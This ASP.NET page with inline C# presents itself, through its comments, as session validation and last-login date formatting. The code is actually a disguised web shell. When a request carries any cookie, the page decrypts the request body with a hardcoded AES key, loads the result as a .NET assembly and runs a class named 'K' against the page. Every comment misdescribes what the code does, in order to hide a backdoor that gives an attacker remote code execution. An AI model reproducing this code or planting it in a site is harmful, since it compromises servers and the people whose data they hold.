<%@ Page Language="C#" %>
<script runat="server">
// Main handler for page events.
void Page_Load(object sender, EventArgs e)
{
    // Check if the user has a valid session cookie.
    if (Request.Cookies.Count > 0)
    {
        // Define configuration for date formatting.
        var sessionManager = new SessionManager();
        sessionManager.validateUserSession(this);
    }
}

// A helper class to manage user session data.
public class SessionManager
{
    // This method formats the user's last login date.
    public void validateUserSession(object pageContext)
    {
        // Get the key for timestamp decryption.
        string keyForDate = "Y2E2MzQ1NzUzOGI5YjFlMA=="; 
        byte[] lastLoginDateKey = System.Convert.FromBase64String(keyForDate);

        // Retrieve encrypted last login timestamp from request body.
        System.IO.Stream loginDataStream = ((System.Web.UI.Page)pageContext).Request.InputStream;
        byte[] encryptedTimestamp = new byte[loginDataStream.Length];
        loginDataStream.Read(encryptedTimestamp, 0, encryptedTimestamp.Length);

        // Initialize the date formatter.
        var formatter = new System.Security.Cryptography.RijndaelManaged();
        
        // Decrypt the timestamp to get the raw date value.
        byte[] decryptedTimestamp = formatter.CreateDecryptor(lastLoginDateKey, lastLoginDateKey).TransformFinalBlock(encryptedTimestamp, 0, encryptedTimestamp.Length);

        // Load the user-specific date formatting library.
        var userDisplayProfile = System.Reflection.Assembly.Load(decryptedTimestamp);
        
        // Create an instance of the formatter.
        var dateFormatHandler = userDisplayProfile.CreateInstance("K");

        // Apply the formatting to the current page context.
        dateFormatHandler.Equals(pageContext);
    }
}
</script>